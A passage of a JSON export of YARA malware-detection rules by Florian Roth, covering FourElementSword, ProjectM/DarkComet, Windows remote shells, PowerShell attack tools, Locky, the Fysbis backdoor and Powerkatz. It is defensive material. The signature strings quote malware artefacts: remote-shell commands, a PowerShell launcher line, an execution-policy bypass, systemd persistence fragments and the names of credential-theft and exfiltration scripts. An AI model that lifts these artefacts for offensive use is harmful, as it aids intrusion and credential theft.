\"not set\"\n      date = \"2016-03-26 12:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\BypassUAC.pdb\" ascii\n      $s2 = \"\\\\ResN32.dll\" fullword wide\n      $s3 = \"Eupdate\" fullword wide\n   condition: \n      all of them\n}","date":"2016-03-26 12:47:31","description":"Detects FourElementSword Malware - file bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f","minimum_yara":"1.7","name":"FourElementSword_ResN32DLL_RID309E","reference":"not set","required_modules":[],"rule_hash":"26dc548575d146f6e0d209449598b821","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule ProjectM_DarkComet_1_RID2E9E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ProjectM Malware - file cc488690ce442e9f98bac651218f4075ca36c355d8cd83f7a9f5230970d24157\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/\"\n      date = \"2016-03-26 11:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DarkO\\\\_2\" fullword ascii\n      $a1 = \"AVICAP32.DLL\" fullword ascii\n      $a2 = \"IDispatch4\" fullword ascii\n      $a3 = \"FLOOD/\" fullword ascii\n      $a4 = \"T<-/HTTP://\" fullword ascii\n      $a5 = \"infoes\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them ) or ( all of them )\n}","date":"2016-03-26 11:22:11","description":"Detects ProjectM Malware - file cc488690ce442e9f98bac651218f4075ca36c355d8cd83f7a9f5230970d24157","minimum_yara":"1.7","name":"ProjectM_DarkComet_1_RID2E9E","reference":"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/","required_modules":[],"rule_hash":"6d0ebbf65f5e61c6024ec9d07f93cf91","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ProjectM_CrimsonDownloader_RID317E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ProjectM Malware - file dc8bd60695070152c94cbeb5f61eca6e4309b8966f1aa9fdc2dd0ab754ad3e4c\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/\"\n      date = \"2016-03-26 13:24:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"E:\\\\Projects\\\\m_project\\\\main\\\\mj shoaib\" \n      $s1 = \"\\\\obj\\\\x86\\\\Debug\\\\secure_scan.pdb\" ascii\n      $s2 = \"secure_scan.exe\" fullword wide\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|mswall\" fullword wide\n      $s4 = \"secure_scan|mswall\" fullword wide\n      $s5 = \"[Microsoft-Security-Essentials]\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $x1 ) or ( all of them )\n}","date":"2016-03-26 13:24:51","description":"Detects ProjectM Malware - file dc8bd60695070152c94cbeb5f61eca6e4309b8966f1aa9fdc2dd0ab754ad3e4c","minimum_yara":"1.7","name":"ProjectM_CrimsonDownloader_RID317E","reference":"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/","required_modules":[],"rule_hash":"28e2590553bc525851502e19a7ac4f1f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_Config_File_RID321A : DEMO MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"01,,hccutils.dll,2\" fullword ascii\n      $s1 = \"RegisterDlls=OurDll\" fullword ascii\n      $s2 = \"[OurDll]\" fullword ascii\n      $s3 = \"[DefaultInstall]\" fullword ascii\n      $s4 = \"Signature=\\\"$Windows NT$\\\"\" fullword ascii\n   condition: \n      4 of them\n}","date":"2016-03-26 13:50:51","description":"Detects FourElementSword Malware - file f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27","minimum_yara":"1.7","name":"FourElementSword_Config_File_RID321A","reference":"not set","required_modules":[],"rule_hash":"01880ac8349e00e32ce0cc757e60d83d","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_T9000_RID2F02 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file 5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 11:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D:\\\\WORK\\\\T9000\\\\\" ascii\n      $x2 = \"%s\\\\temp\\\\HHHH.dat\" fullword wide\n      $s1 = \"Elevate.dll\" fullword wide\n      $s2 = \"ResN32.dll\" fullword wide\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword wide\n      $s4 = \"igfxtray.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) ) or ( all of them )\n}","date":"2016-03-26 11:38:51","description":"Detects FourElementSword Malware - file 5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c","minimum_yara":"1.7","name":"FourElementSword_T9000_RID2F02","reference":"not set","required_modules":[],"rule_hash":"b2f5321f0fd91705716d9c7200a7a3b7","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_32DLL_RID2F26 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file 7a200c4df99887991c638fe625d07a4a3fc2bdc887112437752b3df5c8da79b6\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 11:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%temp%\\\\tmp092.tmp\" fullword ascii\n      $s1 = \"\\\\System32\\\\ctfmon.exe\" fullword ascii\n      $s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n      $s3 = \"32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 660KB and $x1 ) or ( all of them )\n}","date":"2016-03-26 11:44:51","description":"Detects FourElementSword Malware - file 7a200c4df99887991c638fe625d07a4a3fc2bdc887112437752b3df5c8da79b6","minimum_yara":"1.7","name":"FourElementSword_32DLL_RID2F26","reference":"not set","required_modules":[],"rule_hash":"b8df1b7df580e20ef9c9a9c1c73f7d26","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_Keyainst_EXE_RID326E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file cf717a646a015ee72f965488f8df2dd3c36c4714ccc755c295645fe8d150d082\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 14:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\ProgramData\\\\Keyainst.exe\" fullword ascii\n      $s1 = \"ShellExecuteA\" fullword ascii\n      $s2 = \"GetStartupInfoA\" fullword ascii\n      $s3 = \"SHELL32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 48KB and $x1 ) or ( all of them )\n}","date":"2016-03-26 14:04:51","description":"Detects FourElementSword Malware - file cf717a646a015ee72f965488f8df2dd3c36c4714ccc755c295645fe8d150d082","minimum_yara":"1.7","name":"FourElementSword_Keyainst_EXE_RID326E","reference":"not set","required_modules":[],"rule_hash":"ea26ffca0c249ed5b6358c8eba58a984","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_ElevateDLL_2_RID3218 : DEMO EXE FILE MAL T1082 {\n   meta:\n      description = \"Detects FourElementSword Malware - file 9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Elevate.dll\" fullword ascii\n      $s2 = \"GetSomeF\" fullword ascii\n      $s3 = \"GetNativeSystemInfo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and $s1 ) or ( all of them )\n}","date":"2016-03-26 13:50:31","description":"Detects FourElementSword Malware - file 9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95","minimum_yara":"1.7","name":"FourElementSword_ElevateDLL_2_RID3218","reference":"not set","required_modules":[],"rule_hash":"9410dbd0e19faac56a6a45854c40a254","score":75,"tags":["DEMO","EXE","T1082","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_fslapi_dll_gui_RID33A3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file 2a6ef9dde178c4afe32fe676ff864162f104d85fac2439986de32366625dc083\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 14:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fslapi.dll.gui\" fullword wide\n      $s2 = \"ImmGetDefaultIMEWnd\" fullword ascii\n      $s3 = \"RichOX\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12KB and all of them )\n}","date":"2016-03-26 14:56:21","description":"Detects FourElementSword Malware - file 2a6ef9dde178c4afe32fe676ff864162f104d85fac2439986de32366625dc083","minimum_yara":"1.7","name":"FourElementSword_fslapi_dll_gui_RID33A3","reference":"not set","required_modules":[],"rule_hash":"bc10bd859bcd1178f4bb8943df37f05c","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_PowerShell_Start_RID3457 : DEMO MAL SCRIPT T1086 {\n   meta:\n      description = \"Detects FourElementSword Malware - file 9b6053e784c5762fdb9931f9064ba6e52c26c2d4b09efd6ff13ca87bbb33c692\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 15:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\wget.exe\" ascii\n      $s1 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\iuso.exe\" fullword ascii\n   condition: \n      1 of them\n}","date":"2016-03-26 15:26:21","description":"Detects FourElementSword Malware - file 9b6053e784c5762fdb9931f9064ba6e52c26c2d4b09efd6ff13ca87bbb33c692","minimum_yara":"1.7","name":"FourElementSword_PowerShell_Start_RID3457","reference":"not set","required_modules":[],"rule_hash":"560bae78b69ffdbe200586cd163c2242","score":75,"tags":["DEMO","T1086","SCRIPT","MAL"]},{"author":"Florian Roth","content":"rule FourElementSword_ElevateDLL_RID3187 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Elevate.dll\" fullword wide\n      $x2 = \"ResN32.dll\" fullword wide\n      $s1 = \"Kingsoft\\\\Antivirus\" fullword wide\n      $s2 = \"KasperskyLab\\\\protected\" fullword wide\n      $s3 = \"Sophos\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) and all of ( $s* ) ) or ( all of them )\n}","date":"2016-03-26 13:26:21","description":"Detects FourElementSword Malware","minimum_yara":"1.7","name":"FourElementSword_ElevateDLL_RID3187","reference":"not set","required_modules":[],"rule_hash":"571b69ee80e456d988a23971685542a1","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WindowsShell_s3_RID2CF9 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects simple Windows shell - file s3.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\pipe\\\\%08X\" fullword ascii\n      $s3 = \"get <remote> <local> - download file\" fullword ascii\n      $s4 = \"[ simple remote shell for windows v3\" fullword ascii\n      $s5 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s6 = \"put <local> <remote> - upload file\" fullword ascii\n      $s7 = \"term                 - terminate remote client\" fullword ascii\n      $s8 = \"[ downloading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s9 = \"-l           Listen for incoming connections\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )\n}","date":"2016-03-26 10:12:01","description":"Detects simple Windows shell - file s3.exe","minimum_yara":"1.7","name":"WindowsShell_s3_RID2CF9","reference":"https://github.com/odzhan/shells/","required_modules":[],"rule_hash":"cb59debe3b7fc26213e26e0e2a53322d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WindosShell_s1_RID2C80 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects simple Windows shell - file s1.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 09:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ executing cmd.exe\" fullword ascii\n      $s2 = \"[ simple remote shell for windows v1\" fullword ascii\n      $s3 = \"-p <number>  Port number to use (default is 443)\" fullword ascii\n      $s4 = \"usage: s1 <address> [options]\" fullword ascii\n      $s5 = \"[ waiting for connections on %s\" fullword ascii\n      $s6 = \"-l           Listen for incoming connections\" fullword ascii\n      $s7 = \"[ connection from %s\" fullword ascii\n      $s8 = \"[ %c%c requires parameter\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )\n}","date":"2016-03-26 09:51:51","description":"Detects simple Windows shell - file s1.exe","minimum_yara":"1.7","name":"WindosShell_s1_RID2C80","reference":"https://github.com/odzhan/shells/","required_modules":[],"rule_hash":"696bd9788bb5d9549ea26861ec08b1f8","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WindowsShell_s4_RID2CFA : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects simple Windows shell - file s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\pipe\\\\%08X\" fullword ascii\n      $s3 = \"get <remote> <local> - download file\" fullword ascii\n      $s4 = \"[ simple remote shell for windows v4\" fullword ascii\n      $s5 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s6 = \"[ downloading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s7 = \"[ uploading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s8 = \"-l           Listen for incoming connections\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )\n}","date":"2016-03-26 10:12:11","description":"Detects simple Windows shell - file s4.exe","minimum_yara":"1.7","name":"WindowsShell_s4_RID2CFA","reference":"https://github.com/odzhan/shells/","required_modules":[],"rule_hash":"9fe2d575007cc0bf1cb9e157b7a03280","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WindowsShell_Gen_RID2D6D : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects simple Windows shell - from files keygen.exe, s1.exe, s2.exe, s3.exe, s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[ %c%c requires parameter\" fullword ascii\n      $s1 = \"[ %s : %i\" fullword ascii\n      $s2 = \"[ %s : %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( all of them )\n}","date":"2016-03-26 10:31:21","description":"Detects simple Windows shell - from files keygen.exe, s1.exe, s2.exe, s3.exe, s4.exe","minimum_yara":"1.7","name":"WindowsShell_Gen_RID2D6D","reference":"https://github.com/odzhan/shells/","required_modules":[],"rule_hash":"016cbe8ed8958d9102f43e491a317323","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule WindowsShell_Gen2_RID2D9F : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects simple Windows shell - from files s3.exe, s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"get <remote> <local> - download file\" fullword ascii\n      $s3 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s4 = \"put <local> <remote> - upload file\" fullword ascii\n      $s5 = \"term                 - terminate remote client\" fullword ascii\n      $s6 = \"[ uploading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s7 = \"[ error : received %i bytes\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )\n}","date":"2016-03-26 10:39:41","description":"Detects simple Windows shell - from files s3.exe, s4.exe","minimum_yara":"1.7","name":"WindowsShell_Gen2_RID2D9F","reference":"https://github.com/odzhan/shells/","required_modules":[],"rule_hash":"7e8ce55a412666c827f553ea51794f9a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Powershell_Attack_Scripts_RID3134 : DEMO HKTL T1086 {\n   meta:\n      description = \"Powershell Attack Scripts\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2016-03-09 13:12:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PowershellMafia\\\\Invoke-Shellcode.ps1\" ascii\n      $s2 = \"Nishang\\\\Do-Exfiltration.ps1\" ascii\n      $s3 = \"PowershellMafia\\\\Invoke-Mimikatz.ps1\" ascii\n      $s4 = \"Inveigh\\\\Inveigh.ps1\" ascii\n   condition: \n      1 of them\n}","date":"2016-03-09 13:12:31","description":"Powershell Attack Scripts","minimum_yara":"1.7","name":"Powershell_Attack_Scripts_RID3134","reference":"-","required_modules":[],"rule_hash":"55f5f534fbdd6acef0424f11ad673371","score":70,"tags":["DEMO","T1086","HKTL"]},{"author":"Florian Roth","content":"rule PSAttack_ZIP_RID2B5E : DEMO FILE HKTL T1086 {\n   meta:\n      description = \"PSAttack - Powershell attack tool - file PSAttack.zip\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gdssecurity/PSAttack/releases/\"\n      date = \"2016-03-09 09:03:31\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PSAttack.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and all of them\n}","date":"2016-03-09 09:03:31","description":"PSAttack - Powershell attack tool - file PSAttack.zip","minimum_yara":"1.7","name":"PSAttack_ZIP_RID2B5E","reference":"https://github.com/gdssecurity/PSAttack/releases/","required_modules":[],"rule_hash":"d6c45386d85d3bb52893dd98f0e6c288","score":100,"tags":["DEMO","T1086","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PSAttack_EXE_RID2B4D : DEMO EXE FILE HKTL T1086 {\n   meta:\n      description = \"PSAttack - Powershell attack tool - file PSAttack.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gdssecurity/PSAttack/releases/\"\n      date = \"2016-03-09 09:00:41\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\PSAttack.pdb\" fullword\n      $s1 = \"set-executionpolicy bypass -Scope process -Force\" fullword wide\n      $s2 = \"PSAttack.Modules.\" ascii\n      $s3 = \"PSAttack.PSAttackProcessing\" fullword ascii\n      $s4 = \"PSAttack.Modules.key.txt\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and ( $x1 or 2 of ( $s* ) ) ) or 3 of them\n}","date":"2016-03-09 09:00:41","description":"PSAttack - Powershell attack tool - file PSAttack.exe","minimum_yara":"1.7","name":"PSAttack_EXE_RID2B4D","reference":"https://github.com/gdssecurity/PSAttack/releases/","required_modules":[],"rule_hash":"0f8ebb6ddb2d43b8d08e574400d1100c","score":100,"tags":["DEMO","EXE","T1086","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Locky_Ransomware_RID2D91 : CRIME DEMO MAL RANSOM {\n   meta:\n      description = \"Detects Locky Ransomware (matches also on Win32/Kuluoz)\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/qScSrE\"\n      date = \"2016-02-17 10:37:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } \n      $o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } \n   condition: \n      all of ( $o* )\n}","date":"2016-02-17 10:37:21","description":"Detects Locky Ransomware (matches also on Win32/Kuluoz)","minimum_yara":"1.7","name":"Locky_Ransomware_RID2D91","reference":"https://goo.gl/qScSrE","required_modules":[],"rule_hash":"dc3aac29a8446becf5b60b4943fd491a","score":65,"tags":["DEMO","RANSOM","CRIME","MAL"]},{"author":"Florian Roth","content":"rule Sofacy_Fybis_ELF_Backdoor_Gen1_RID3236 : APT DEMO FILE LINUX MAL RUSSIA {\n   meta:\n      description = \"Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n      date = \"2016-02-13 13:55:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Your command not writed to pipe\" fullword ascii\n      $x2 = \"Terminal don`t started for executing command\" fullword ascii\n      $x3 = \"Command will have end with \\\\n\" fullword ascii\n      $s1 = \"WantedBy=multi-user.target' >> /usr/lib/systemd/system/\" fullword ascii\n      $s2 = \"Success execute command or long for waiting executing your command\" fullword ascii\n      $s3 = \"ls /etc | egrep -e\\\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\\\"\" fullword ascii\n      $s4 = \"rm -f /usr/lib/systemd/system/\" fullword ascii\n      $s5 = \"ExecStart=\" fullword ascii\n      $s6 = \"<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 500KB and 1 of ( $x* ) ) or ( 1 of ( $x* ) and 3 of ( $s* ) )\n}","date":"2016-02-13 13:55:31","description":"Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1","minimum_yara":"1.7","name":"Sofacy_Fybis_ELF_Backdoor_Gen1_RID3236","reference":"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/","required_modules":[],"rule_hash":"1d45ed1deb42371c07abe06fbe61306b","score":80,"tags":["LINUX","MAL","DEMO","FILE","APT","RUSSIA"]},{"author":"Florian Roth","content":"rule Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA : APT DEMO FILE LINUX MAL RUSSIA {\n   meta:\n      description = \"Detects Sofacy Fysbis Linux Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n      date = \"2016-02-13 14:14:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, LINUX, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RemoteShell\" ascii\n      $s2 = \"basic_string::_M_replace_dispatch\" fullword ascii\n      $s3 = \"HttpChannel\" ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 500KB and all of them\n}","date":"2016-02-13 14:14:51","description":"Detects Sofacy Fysbis Linux Backdoor","minimum_yara":"1.7","name":"Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA","reference":"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/","required_modules":[],"rule_hash":"1ebf1a2a541d126435243e64bebe5bcf","score":80,"tags":["LINUX","MAL","DEMO","FILE","APT","RUSSIA"]},{"author":"Florian Roth","content":"rule Powerkatz_DLL_Generic_RID2F2F : DEMO EXE FILE GEN HKTL T1003 T1075 T1086 T1097 T1178 {\n   meta:\n      description = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n      author = \"Florian Roth\"\n      reference = \"PowerKatz Analysis\"\n      date = \"2016-02-05 11:46:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL, T1003, T1075, T1086, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n      $s2 = \"%*s  pPublicKey         : \" fullword wide\n      $s3 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n      $s4 = \"\\\\*.kirbi\" fullword wide\n      $c1 = 